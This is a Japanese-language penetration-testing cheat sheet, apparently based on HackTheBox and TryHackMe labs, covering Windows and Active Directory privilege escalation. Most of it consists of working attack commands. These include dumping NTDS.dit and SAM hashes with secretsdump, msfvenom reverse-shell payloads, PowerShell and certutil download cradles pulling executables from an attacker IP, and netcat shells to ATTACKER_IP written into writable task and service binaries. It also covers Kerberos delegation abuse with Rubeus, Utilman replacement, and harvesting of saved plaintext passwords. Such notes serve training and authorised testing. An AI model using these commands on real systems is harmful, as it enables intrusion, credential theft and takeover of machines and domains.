### windows認証プロトコル

主にNet-NTLMv1/v2かKerberosで認証情報を確認する  

#### Net-NTLMv1/v2
脆弱であり、Microsoftも使用しないように注意喚起をしていて、windows2000以降のドメイン環境ではkerborosとなっているが、  
**なんらかの理由でkerberosプロトコルがネゴシエートされない場合は、Net-NTLMv1/v2が使用される仕組みになっている。**  



### PrincipalとSPN
Principalとは、kerberosを使用して認証できるユーザーやサービス固有の名前を指す。
**ユーザーの場合は、UPNで、サーバーの場合は、SPN**



### Groups.xml
windows2012より前のローカル管理者を追い出したい場合に、ローカルアカウント情報が保存されるグループポリシーファイルで、  
グループポリシーで実行されているアカウントごとのランダムなパスワードなどが含まれている  
   
### pivotingについて
まずは、pivotingはsmb,winrmについての区別をつけること   
hack the box - blackfield   

例:   
smbmapでユーザーリストを列挙→弱いユーザーアカウントを狙って侵害する   
→侵害したユーザーからsmbmapスキャンで最初のsmbmapで発見できなかったアカウントを見つけての繰り返し   

### SeBackupPrivilege を使用した NTDS.dit ハッシュのダンプ

robocopy
```
robocopy /b C:\Windows\NTDS C:\Profiles NTDS.dit
```

robocopyを使用して ntds.dit ファイルのコピーを作成するのが一番ベストではあるが、  
何らかの理由でrobocopyが使用できない場合は以下のテクを使う  


diskshadow.exe に C: のコピーを作成し、それに Z: という名前を付けて公開する (ドライブとしてアクセスできるようにする)   

```
echo "set context persistent nowriters" | out-file ./diskshadow.txt -encoding ascii
echo "add volume c: alias temp" | out-file ./diskshadow.txt -encoding ascii -append
echo "create" | out-file ./diskshadow.txt -encoding ascii -append        
echo "expose %temp% z:" | out-file ./diskshadow.txt -encoding ascii -append
```

diskshadow.txt ファイルを作成した後、次のコマンドを使用してシャドウ コピーを作成し、Z:\ ドライブとして表示できるようにする  

```
diskshadow.exe /s c:\temp\diskshadow.txt
```

最後にZドライブに移動してrobocopyでコピーする
```
robocopy /b .\ C:\temp NTDS.dit
```

ntds.dit ファイルを取得した後、レジストリから SYSTEM ファイルも取得し、これらの両方を攻撃者のマシンに送信してローカルにダンプする必要がある  

```
cd C:\temp
reg.exe save hklm\system C:\temp\system.bak
```

あとは、ローカル上でsecretdump.pyを使用してハッシュを取得する  

```
secretsdump.py -ntds ntds.dit -system system.bak LOCAL > hashes.txt
```


# Windows権限昇格手法  

### C:\Windows\Temp上でアップロード前に実行する  
```
# I prefer to do this on C:\Windows\Temp to can write without problems

echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```
そのあとに以下実行でファイルをダウンロード  
```
cscript wget.vbs http://10.10.14.2:8000/ms15-051x64.exe hello.exe
```

### ドメインユーザーのリストを取得する

```
net user <win_username> /domain
```


### リバースシェル生成

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.103 LPORT=4444 -f exe -o /home/kali/Desktop/rs_exploitl.exe
```

### icaclsによる権限設定漏れからの権限昇格

#### 権限情報の確認
```
icacls <権限を確認したいファイルのパス>
```

  
権限一覧  
N – アクセス権なし  
F – フルアクセス権  
M – 変更アクセス権  
RX – 読み取りと実行のアクセス権  
R – 読み取り専用アクセス権  
W – 書き込み専用アクセス権  
D – 削除アクセス権  
  
#### 手動で権限を昇格する
```
icacls <権限昇格したいファイルのパス> /grant <ユーザー名>:<Perm>
icacls C:\work\test.txt /grant Everyone:F
```

### Auto Logon
windowsで自動ログインさせるためのもの平文でユーザー名、パスワードが保存されている
```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select "Default*"
```

### ユーザーが実行しているバイナリーがあるかを探す。
```
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v """
```

### windows exploit suggester  
侵入した先でsysteminfoコマンドを入力して出力結果をテキストファイルにコピー、  
そのあと自分のターミナル上で以下のコマンドで脆弱なバージョンかどうかを調べられる  
```
./windows-exploit-suggester.py --database 2023-08-05-mssb.xls --systeminfo win7info.txt
```

### AlwaysInstallElevatedがオンの際にできる権限昇格

これら 2 つのレジスタが有効になっている (値が 0x1) 場合  
任意の権限を持つユーザーは*.msiファイルを NT AUTHORITY\SYSTEM としてインストール (実行) できる  
→だからmsi形式のリバースシェルを実行すれば権限昇格できる  

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.36 LPORT=9002 -f msi > payload.msi
```

### 自分の所属するグループにGenericAll権限がある際の権限昇格

GenericAll権限が付与されている場合は、Kerberos リソースベースの制約付き委任攻撃ができる  
→つまり、TGTをリクエストすることができる  
使用するツール: Powermad.ps1 , Rubeus.exe  

まずサーバー側で以下を設定する

新しい偽のコンピューター オブジェクトを AD に追加  
新しい偽のコンピューター オブジェクトに制約付き委任権限を設定  
新しい偽のコンピューターのパスワード ハッシュを生成  
そして、Rubeusを使用して、パスワードハッシュを生成してあげる  

```
# -------- On Server Side
# Upload tools
upload /home/user/Tools/Powermad/Powermad.ps1 pm.ps1
upload /home/user/Tools/Ghostpack-CompiledBinaries/Rubeus.exe r.exe

# Import PowerMad
Import-Module ./pm.ps1

# Set variables
Set-Variable -Name "FakePC" -Value "FAKE01"
Set-Variable -Name "targetComputer" -Value "DC"

# With Powermad, Add the new fake computer object to AD.
New-MachineAccount -MachineAccount (Get-Variable -Name "FakePC").Value -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# With Built-in AD modules, give the new fake computer object the Constrained Delegation privilege.
Set-ADComputer (Get-Variable -Name "targetComputer").Value -PrincipalsAllowedToDelegateToAccount ((Get-Variable -Name "FakePC").Value + '$')

# With Built-in AD modules, check that the last command worked.
Get-ADComputer (Get-Variable -Name "targetComputer").Value -Properties PrincipalsAllowedToDelegateToAccount
```

Rubeus  

```
# With Rubeus, generate the new fake computer object password hashes. 
#  Since we created the computer object with the password 123456 we will need those hashes
#  for the next step.
./Rubeus.exe hash /password:123456 /user:FAKE01$ /domain:support.htb
```

最後に、攻撃側でTGTをリクエストする  

```
# -------- On Attck Box Side.
# Using getTGT from Impacket, generate a ccached TGT and used KERB5CCNAME pass the ccahe file for the requested service. 
#   If you are getting errors, "cd ~/impacket/", "python3 -m pip install ."
/home/user/Tools/impacket/examples/getST.py support.htb/FAKE01 -dc-ip dc.support.htb -impersonate administrator -spn http/dc.support.htb -aesKey 35CE465C01BC1577DE3410452165E5244779C17B64E6D89459C1EC3C8DAA362B

# Set local variable of KERB5CCNAME to pass the ccahe TGT file for the requested service.
export KRB5CCNAME=administrator.ccache

# Use smbexec.py to connect with the TGT we just made to the server as the user administrator 
#  over SMB protocol.
smbexec.py support.htb/administrator@dc.support.htb -no-pass -k
```

### reverse shell 
```
powershell iex(new-object net.webclient).downloadstring('http://10.10.14.2:8000/Invoke-PowerShellTcp.ps1')
certutil.exe -urlcache -split -f "http://10.10.14.2:8000/MS10-059.exe" MS10-059.exe
```



### windowsの権限昇格でよく見るリッスンコマンド  
```
rlwrap nc -nvlp 4444
```

### typeでファイルを出力できない場合
moreコマンドを使用する
```
more "<テキスト.txt>"
```

### 例外的な場所にフラグがある場合  
```
C:\Documents and Settings\<ユーザー名>\Desktop\User.txt
```

### 簡易ファイルサーバーからファイルをダウンロードする  
``` powershell -c "Invoke-WebRequest -Uri 'http://<自分のIP>:8000/reverse_shell.exe' -OutFile 'C:\Windows\Temp\reverse_shell.exe'" ```  
ちなみにpython3側では``` python3 -m http.server ```で簡易うｐ鯖を建てられる(デフォルトでポートは8000)  

### smb経由でファイルをダウンロード
攻撃者側
```
smbserver.py share .
```

やられ側  
```
> net use \\10.10.14.3\
> copy \\10.10.14.3\Chimichurri.exe .
```

### よく使うWindowsコマンド一覧  
現在のユーザーネームを表示
``` echo %usernamem% ```

ファイル名を変更する  
``` ren 元のファイル名　先のファイル名 ```

### PowerShellのログを確認する  

``` type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt ```  
<br>※また、PowerShellで実行する場合には%userprofile%を$Env:userprofileに変更する必要がある  

### うまくexploitが刺さらない場合
32bit環境なのか64bit環境なのかを確認して、
その実行しているエクスプロイトがどっちのbitに対応しているのかを確認すること
```
C:\ > [Environment]::Is64BitProcess
trueかfalseで返事が返ってくる
```
詳しくは以下のリンクのExploit項目を読むこと  
https://zenn.dev/sosawa/articles/6b55ab223c5972


  ### Windows内に保存されているクレデンシャル情報を確認する  
  ```cmdkey /list```
実際のパスワードを見ることはできませんが、試す価値のある認証情報があれば、以下のようにrunasコマンドと/savecredオプションで使用することが可能
```runas /savecred /user:admin cmd.exe```


### Puttyに保存されている平文の認証情報を含むプロキシパスワードを確認する
```reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s```


### スケジュールタスクを調べて書き換え可能なバイナリがないかを調べる
``` schtasks /query /tn vulntask /fo list /v```
##### また、出力結果内で重要となってくるのが"Task to Run"と"Run As User"という項目で<br>もし、現在のユーザーが "Task to Run "実行ファイルを変更または上書きすることができれば<br>taskusr1ユーザーによって実行されるものを制御することができ、結果として単純な特権の昇格を実現することができる。
``` 
C:\> icacls c:\tasks\schtask.bat
c:\tasks\schtask.bat NT AUTHORITY\SYSTEM:(I)(F)
                    BUILTIN\Administrators:(I)(F)
                    BUILTIN\Users:(I)(F)
```

##### (I)と(F)は権限のことで、(F)はフルアクセスを指している。
つまり今回の例だとこのバッチファイルをリバールシェルに書き換えればrootになれる  
以下はバッチをリバースシェルに書き換える例  
``` C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat ```



### msiファイルを利用して権限昇格する
msiでは任意のユーザーアカウント（非特権ユーザーも含む）から、より高い特権で実行されるように設定することができる。  
これにより、管理者権限で実行される悪意のあるMSIファイルを生成することができるが、それには以下の2うのレジストリ値を設定する必要がある。
```
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
以下はmsfvenomでmsi形式のリバースシェルを生成する例
```msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi```
<br>生成したファイルをターゲットPCに送り込んで実行する例
```C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi```


## 自動列挙ツール

```
PrivescCheck は、ターゲット システムで一般的な権限昇格を検索するPowerShellスクリプト
PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force
PS C:\> . .\PrivescCheck.ps1
PS C:\> Invoke-PrivescCheck

WES-NG windows exploit suggestier
systeminfoの情報をテキストファイルに貼り付けてローカル上でWES-NGを実行する
user@kali$ wes.py systeminfo.txt
```


## パスワード漏洩からの権限昇格

### 無人Windowsインストールによるパスワード漏洩

多数のホストに Windows をインストールする場合、管理者は Windows 展開サービスを使用して、ネットワーク経由で複数のホストにOSをインストールする  
→**この方法でのインストールは、平文パスワードが以下の場所に格納されている可能性が高い**  

```
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

### Powershellのコマンド履歴を漁る

ユーザーが Powershell を使用してコマンドを実行するたびに、そのコマンドは過去のコマンドのメモリを保持する以下のファイルに保存される  

```
type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

### ログオン情報からパスワード漏洩
ユーザーは自動的にログオンされる場合は、以下のレジストリにユーザー名とパスがレジストリに保存される

```
reg query “HKLM\SOFTWARE\microsoft\windows nt\currentversion\winlogon”
```

### VNCパスワード漁る
  
```
https://octothorp88.medium.com/tryhackme-allsignspoint2pwnage-581f6ac4a7e8
```

ㅤ  
ㅤ  
### 保存されているユーザー名とパスワードまたは資格情報を一覧表示する

```
cmd /key
```
  
#### パスワードの自動入力機能を使用してパスワード要求を回避する

/savecredが以前に使用された場合や、cmdkey /listで資格情報がある場合は、次回以降はパスワード要求しないでもコマンドを実行できる  
→つまりこれを悪用することで、パスワード要求を回避することができる  
  
```
runas /savecred /user:admin cmd.exe
```

ㅤ  
ㅤ  
### IISのweb.configからのパスワード漏洩
  
IIS上のweb構成はweb.configというファイルに保存される  
→**データベースのパスワードや認証メカニズムはweb.configに保存されることがある**  
  
```
ファイル上のデータベース接続文字列を見つける
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```
  
### Puttyの認証資格情報からパスワードを取得する
  
Puttyでは、**クリアテキストの認証資格情報を含むプロキシ構成を保存している**  
  
```
保存されているプロキシ資格情報を取得する
reg query HKEY_CURRENT_USER\Software\SimonTatham(ユーザー名)\PuTTY\Sessions\ /f "Proxy" /s
```
  
**このように、ブラウザ、電子メール クライアント、FTPクライアント、SSHクライアント、VNC ソフトウェアなど、パスワードを保存するすべてのソフトウェアには、ユーザーが保存したパスワードを回復する方法がある**  
ㅤ  
ㅤ  
ㅤ  
ㅤ  
ㅤ  
ㅤ  
## 構成ミスからの権限昇格

### スケジュールされたタスクを確認する

スケジュールされたタスクを調べると、**バイナリが失われたか、変更可能なバイナリを使用しているスケジュールされたタスクが表示される場合がある**  
→schtasksコマンドでタスクの詳細表示を取得することができる  

```
schtasks /query /tn vulntask /fo list /v

icaclsでタスクのファイルの権限を確認する
icacls c:\tasks\schtask.bat

仮に所属しているグループにフルアクセス(F)がある場合は、sctask.batに以下で書き換えをしてリバースシェルを取得できる
C:\> echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```

#### 手動でタスクを開始する
  
タスクがトリガするまで時間がかかる場合は以下のコマンドで手動でタスクを実行させることができる  
  
```
schtasks /run /tn vulntask
```
ㅤ  
ㅤ  
### AlwaysInstallElevatedが有効な場合の権限昇格
  
通常、インストーラーは、それを起動したユーザーの権限レベルで実行されるが、  
**AlwaysInstallElevatedが有効な場合は、任意のユーザー アカウント (権限のないアカウントも含む) からより高い権限で実行するように構成できる**  
  
また、この方法では、**以下の2つのレジストリ値を設定する必要がある。**
```
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

そして、msfvenomでmsiファイルを生成する  
  
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```

最後に、以下のコマンドでインストーラーを実行してリバースシェルを受け取る  
  
```
C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```
ㅤ  
ㅤ  
ㅤ  
ㅤ  
### Windowsサービスの設定ミスから権限昇格

Windowsサービスは、Windowsで長時間動作して、ユーザーのやりとりなしで特定機能を実行するもの  
→例えば、**レジストリを登録して実行するファイルのようなものたちがそれ**  
権限の不備や、実行ファイルの破損などから権限を昇格させることができる  
ㅤ  

サービスの随意アクセス制御リスト（DACL）の確認方法。  
Process Hacker で確認できる。  

すべてのサービス構成は以下のレジストリに保存される  

```
HKLM\SYSTEM\CurrentControlSet\Services\
```
ㅤ  
以下でサービスの詳細を表示できる
  
**scコマンドが実行できない場合は、sc.exe、もしくは、Set-Contentを使用すること**  
  
```
WindowsSchedulerサービスについての情報を取得する

C:\> sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: windowsscheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe   実行されるファイル
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcuser1  サービス実行に使用されるアカウント名
```

ㅤ  
#### サービス実行可能ファイルに対する安全でない権限

```
ここで、icaclsでBINARY_PATH_NAMEの権限を確認して、不備がある場合は、リバースシェルを実行できる
C:\Users\thm-unpriv>icacls C:\PROGRA~2\SYSTEM~1\WService.exe
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)　Mは、変更権限があるという意味

以下でリバースシェルを設置できる
C:\> cd C:\PROGRA~2\SYSTEM~1\

C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
        Successfully processed 1 files.

最後に、サービスを一度停止してから、実行してリバースシェルを開始する
C:\> sc stop windowsscheduler
C:\> sc start windowsscheduler
```
ㅤ  
ㅤ  
ㅤ  
### 引用符で囲まれていないサービスパス

例えば以下のようなBINARY_PATH_NAMEが存在するとする

```
C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
```
  
このプログラムを実行する際にWindowsは以下の解釈を行う  
```
C:\MyPrograms\Disk.exe
↓存在しないため、実行ファイルの検索を続行
C:\MyPrograms\Disk Sorter.exe
↓存在しないため、実行ファイルの検索を続行
C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe
```

なお、Windowsはこのバグの悪用に対処するために、  
**権限のないユーザーが書き込みできない場所に、C:\Program FilesまたはC:\Program Files (x86)デフォルトでインストールされる**  
逆をいえば**パスが誰でも書き込み可能な場合、脆弱性が悪用される可能性がある**  

```
Disk SorterバイナリがC:\MyPrograms配下にあり、ユーザーがサブディレクトリやファイルを作成できる権限(AD権限、WD権限)がある場合

C:\>icacls c:\MyPrograms
c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
              BUILTIN\Administrators:(I)(OI)(CI)(F)
              BUILTIN\Users:(I)(OI)(CI)(RX)
              BUILTIN\Users:(I)(CI)(AD)
              BUILTIN\Users:(I)(CI)(WD)
              CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files


以下のDisk.exeというリバースシェルを生成して配置、サービス再起動でシェルを取得できる
C:\> move C:\Users\thm-unpriv\reverseshell.exe C:\MyPrograms\Disk.exe
C:\> icacls C:\MyPrograms\Disk.exe /grant Everyone:F
        Successfully processed 1 files.

C:\> sc stop "disk sorter enterprise"
C:\> sc start "disk sorter enterprise"
```

ㅤ  
ㅤ  
### 安全でないサービス権限

**サービス DACL (サービスの実行可能DACLではありません) によってサービスの構成を変更できる場合は、サービスを再設定できる**  
これにより、必要な実行可能ファイルを指定して、SYSTEM 自体を含む任意のアカウントで実行できる  

ㅤ  
ㅤ  
#### サービスDACLを確認する

SysinternalsスイートのAccesschkを使用する  

```
thmserviceのサービスDACLを確認する例:

C:\tools\AccessChk> accesschk64.exe -qlc thmservice
  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users  　Usersグループにサービスの構成権限がある
        SERVICE_ALL_ACCESS 　UsersグループでもSERVICE_ALL_ACCESSができることがわかる
```

このように自分自身にサービスの再構成の権限がある場合は、以下でリバースシェルを実行することができる

```
C:\> icacls C:\Users\thm-unpriv\reverseshell.exe /grant Everyone:F
C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem

C:\> sc stop THMService
C:\> sc start THMService
```
ㅤ  
ㅤ  
ㅤ  
ㅤ  
ㅤ  
ㅤ  
## Windows権限の悪用(whoami /priv)

### SeBackup / SeRestoreを悪用する

SeBackupPrivilegeとSeRestorePrivilegeが有効な場合、ユーザーは通常のアクセス制限を迂回して、C:\Windows\system32を含むシステム全体のファイルやディレクトリに対して読み取りおよび書き込みを行う権限を持つ  


**・SAMとSYSTEMを読んでsecretsdumpする**  
**・Utilmanをcmdに書き換える**  

  
ユーザーは、 DACL を無視して、システム内の任意のファイルを読み書きできる  
→**SAM および SYSTEM レジストリ ハイブをコピーして、ローカル管理者のパスワード ハッシュを抽出できる**  

```
SAMとSYSTEMの取得
C:\> reg save hklm\system C:\Users\THMBackup\system.hive
The operation completed successfully.

C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive
The operation completed successfully.

kali側にコピーする
C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\

ハッシュを抜き取る
$impacket-secretsdump -sam sam.hive -system system.hive LOCAL

抜き取ったハッシュでpsexecで接続する
user@attackerpc$ python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94
```


ㅤ  
ㅤ  
### SeTakeOwnershipを悪用する

ユーザーはファイルやレジストリ キーを含むシステム上のあらゆるオブジェクトの所有権を取得できる  
→**SYSTEM として実行されているサービスを検索し、サービスの実行可能ファイルの所有権を取得できる**  

ㅤ  
ㅤ  
#### Utilmanを悪用して権限昇格する

Utilmanは**SYSTEM権限で実行されるロック画面で簡単操作オプションを提供するために使用される組み込みのWindowsアプリ**  
→Utilmanを任意のペイロードに置き換えればSYSTEM権限を取得することができる  

```
Utilmanの所有権を取得する
C:\> takeown /f C:\Windows\System32\Utilman.exe
SUCCESS: The file (or folder): "C:\Windows\System32\Utilman.exe" now owned by user "WINPRIVESC2\thmtakeownership".

utilman.exe に対する完全な権限をユーザーに付与する
C:\> icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
processed file: Utilman.exe
Successfully processed 1 files; Failed processing 0 files

utilman.exeをcmd.exeに置き換える
C:\Windows\System32\> copy cmd.exe utilman.exe
        1 file(s) copied.


最後にスタートボタンから画面をロックして、簡単操作(Ease of Access)ボタンをクリックするとSYSTEM権限でcmdが起動する
rdesktopでwindows+Uでcmdが起動される
```


ㅤ  
ㅤ  
### SeImpersonate / SeAssignPrimaryTokenを悪用する

プロセスは他のユーザーになりすまし、そのユーザーに代わって動作することができる  
→攻撃者として、SeImpersonate または SeAssignPrimaryToken 権限を持つプロセスを制御することができれば、  
そのプロセスに接続して認証する任意のユーザーになりすますことができる  

#### RogueWinRMで権限昇格する

```
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
```
ㅤ  
ㅤ  
ㅤ  
ㅤ  
ㅤ  
ㅤ  
## 脆弱なソフトウェアの悪用
  
Wmicツールを使用することで、ターゲット システムにインストールされているソフトウェアとそのバージョンを一覧表示できる  
以下のコマンドは、インストールされているソフトウェアについて収集できる情報をダンプできる  

```
wmic product get name,version,vendor
返ってきた情報から気になるソフトとバージョンの既知の脆弱性をググる
```
